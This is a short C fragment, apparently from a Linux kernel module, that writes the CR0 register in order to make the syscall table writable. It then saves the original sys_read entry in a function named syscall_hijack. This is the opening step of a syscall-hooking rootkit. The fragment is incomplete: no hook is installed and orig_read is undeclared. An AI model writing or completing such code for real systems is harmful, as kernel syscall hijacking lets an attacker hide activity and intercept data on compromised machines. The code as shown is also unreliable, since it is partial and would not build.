#include <linux/kallsyms.h>
#include <syscall.h>

unsigned long cr0;

extern unsigned long __force_order;

// Change cr0 reg to 1 to modify syscall table
static inline void write_forced_cr0(unsigned long val) {
    asm volatile("mov %0, %%cr0": "+r" (val), "+m"(__force_order));
}

static void syscall_hijack(void) {
    orig_read = (typeof(ksys_read) *)sys_call_table[__NR_read];
    pr_info("chs: orig sys_read [%p]\n", orig_read);
}

